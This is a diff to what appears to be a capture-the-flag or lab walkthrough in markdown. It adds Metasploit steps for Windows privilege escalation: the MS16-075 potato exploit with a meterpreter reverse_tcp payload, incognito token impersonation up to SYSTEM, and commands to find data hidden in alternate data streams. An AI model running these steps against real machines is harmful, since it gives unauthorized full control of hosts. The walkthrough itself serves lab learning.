@@ -86,4 +86,33 @@ session 1
 getuid
 getprivs 
 run post/multi/recon/local_exploit_suggester 
+
+// now we are going to do potato attack 
+use exploit/windows/local/ms16_075_reflection 
+background 
+options 
+set payload windows/x64/meterpreter/reverse_tcp
+run 
+
+// now we got the shell 
+load incognito 
+list_tokens -u 
+
+// we have impersonate tokens (for system)
+imporsonate_token "NT AUTHORITY\SYSTEM"
+shell 
+
+// now we are system user 
+whoami
+nt authority\system 
+```
+
+here data is hidden in [alternate data stream](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams), it is used to hide a data within a file 
+
+```
+// to see the alternate stream file 
+dir /R 
+
+// to read the file 
+more < file_name 
 ```
